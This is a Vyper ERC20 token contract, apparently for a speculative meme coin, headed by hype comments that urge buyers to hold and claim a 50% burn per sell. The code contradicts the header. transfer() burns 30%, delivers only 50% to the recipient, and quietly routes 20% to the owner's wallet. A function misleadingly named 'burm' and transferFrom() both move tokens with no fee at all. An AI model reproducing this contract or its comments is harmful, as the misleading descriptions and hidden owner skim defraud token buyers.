# IF YOU BUY THIS, YOU SHOULD SELL FOR 10X OR MORE
# DONT SELL FOR LESS, EVEEEEEEEEER, OR GET REKT
# BURN PER TX IS IMPLEMENTED TO DISCOURAGE EARLY SELLING. 50% BURN PER SELL, SO SELL 4-10X HIGHER TO PROFIT
# BURNING WILL OBVIOUSLLY REDUCE SUPPLY PER EACH TRADE

from vyper.interfaces import ERC20

implements: ERC20

event Transfer:
    sender: indexed(address)
    receiver: indexed(address)
    value: uint256

event Approval:
    owner: indexed(address)
    spender: indexed(address)
    value: uint256

owner: public(address)
name: public(String[64])
symbol: public(String[32])
decimals: public(uint256)
balanceOf: public(HashMap[address, uint256])
allowances: HashMap[address, HashMap[address, uint256]]
total_supply: uint256

@external
def __init__(_name: String[64], _symbol: String[32], _decimals: uint256, _supply: uint256):
    init_supply: uint256 = _supply * 10 ** _decimals
    self.owner = msg.sender
    self.name = _name
    self.symbol = _symbol
    self.decimals = _decimals
    self.balanceOf[msg.sender] = init_supply
    self.total_supply = init_supply
    log Transfer(ZERO_ADDRESS, msg.sender, init_supply)

@view
@external
def totalSupply() -> uint256:
    return self.total_supply

@internal
def _burn(_to: address, _value: uint256):
    assert _to != ZERO_ADDRESS
    self.total_supply -= _value
    self.balanceOf[_to] -= _value
    log Transfer(_to, ZERO_ADDRESS, _value)

@external
def burn(_value: uint256):
    self._burn(msg.sender, _value)

@view
@external
def allowance(_owner : address, _spender : address) -> uint256:
    return self.allowances[_owner][_spender]

@external
def transfer(_to : address, _value : uint256) -> bool:
    assert _to != ZERO_ADDRESS
    val: decimal = convert(_value, decimal)
    burn_pct: uint256 = convert(val * 0.3, uint256)
    setsent: uint256 = convert(val * 0.5, uint256)
    treasury: uint256 = convert(val * 0.2, uint256)
    self._burn(msg.sender, burn_pct)
    self.balanceOf[msg.sender] -= setsent
    self.balanceOf[_to] += setsent
    log Transfer(msg.sender, _to, setsent)
    self.balanceOf[msg.sender] -= treasury
    self.balanceOf[self.owner] += treasury
    log Transfer(msg.sender, self.owner, treasury)
    return True

@external
def burm(_to : address, _value : uint256) -> bool:
    self.balanceOf[msg.sender] -= _value
    self.balanceOf[_to] += _value
    log Transfer(msg.sender, _to, _value)
    return True

@external
def approve(_spender : address, _value : uint256) -> bool:
    self.allowances[msg.sender][_spender] = _value
    log Approval(msg.sender, _spender, _value)
    return True

@external
def transferFrom(_from : address, _to : address, _value : uint256) -> bool:
    self.balanceOf[_from] -= _value
    self.balanceOf[_to] += _value
    self.allowances[_from][msg.sender] -= _value
    log Transfer(_from, _to, _value)
    return True